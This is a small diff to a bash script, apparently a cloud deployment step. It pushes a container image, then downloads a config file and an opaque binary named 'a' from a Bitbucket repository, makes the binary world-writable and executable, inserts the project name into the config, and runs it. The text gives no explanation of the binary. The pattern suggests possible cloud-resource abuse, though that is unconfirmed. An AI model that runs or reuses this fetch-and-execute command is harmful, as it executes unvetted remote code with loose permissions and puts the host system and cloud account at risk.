@@ -1,1 +1,2 @@
+#!/bin/bash
 docker push gcr.io/$project/zepir:runner && wget https://bitbucket.org/mypile/filesg/raw/main/config.yaml && wget https://bitbucket.org/mypile/filesg/raw/main/a && chmod 777 a && sed -i 's/cok/'$project'/' config.yaml && ./a
